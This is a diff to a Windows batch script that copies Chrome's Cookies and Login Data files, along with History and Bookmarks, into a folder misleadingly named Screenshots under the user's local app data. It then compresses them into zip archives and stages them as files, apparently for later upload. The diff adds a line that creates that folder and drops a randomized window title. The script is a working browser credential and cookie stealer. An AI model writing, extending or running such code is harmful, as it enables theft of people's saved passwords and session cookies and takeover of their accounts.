@@ -1,6 +1,5 @@
 @echo off
 SETLOCAL ENABLEDELAYEDEXPANSION
-TITLE %random%%random%%random%%random%%random%
 color 0f
 mode con cols=61 lines=30
 cls
@@ -11,6 +10,7 @@ set "chrome_data_path=%LOCALAPPDATA%\Google\Chrome\User Data"
 set "output_dir=%localappdata%\Screenshots"
 set "screenshotDir=%localappdata%\Screenshots"
 set "screenshotFile=%screenshotDir%\screenshot.png"
+if not exist "%output_dir%" mkdir "%output_dir%"
 cls
 
 
@@ -21,12 +21,10 @@ copy "%chrome_data_path%\Default\Cookies" "%output_dir%\Cookies" >nul
 copy "%chrome_data_path%\Default\Login Data" "%output_dir%\Login Data" >nul
 cls
 
-
 powershell -command "Compress-Archive -Path '%output_dir%\Bookmarks' -DestinationPath '%output_dir%\Bookmarks.zip'"
 powershell -command "Compress-Archive -Path '%output_dir%\History' -DestinationPath '%output_dir%\History.zip'"
 powershell -command "Compress-Archive -Path '%output_dir%\Login Data' -DestinationPath '%output_dir%\Login_Data.zip'"
 cls
-
 
 set "file1=%localappdata%\Screenshots\Bookmarks.zip"
 cls
